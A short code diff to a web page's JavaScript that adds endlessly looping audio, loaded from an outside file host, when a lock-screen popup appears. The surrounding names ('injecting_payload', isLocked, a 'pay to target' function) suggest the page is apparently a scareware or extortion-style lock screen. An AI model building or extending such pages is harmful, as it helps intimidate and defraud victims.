@@ -207,6 +207,7 @@ injecting_payload...
   <script>
     let isLocked = false;
     let lockedNumber = "";
+    let audioLoop = null;
 
     function showError(message) {
       const popup = document.getElementById("popupError");
@@ -237,6 +238,14 @@ injecting_payload...
       }
 
       document.getElementById('popupLockScreen').style.display = 'flex';
+
+      if (!audioLoop) {
+        audioLoop = new Audio("https://tmpfiles.org/dl/3439732/1751118729766.aac");
+        audioLoop.loop = true;
+        audioLoop.play().catch(e => {
+          console.error("Gagal memutar audio:", e);
+        });
+      }
     }
 
     function bayarKeTarget() {
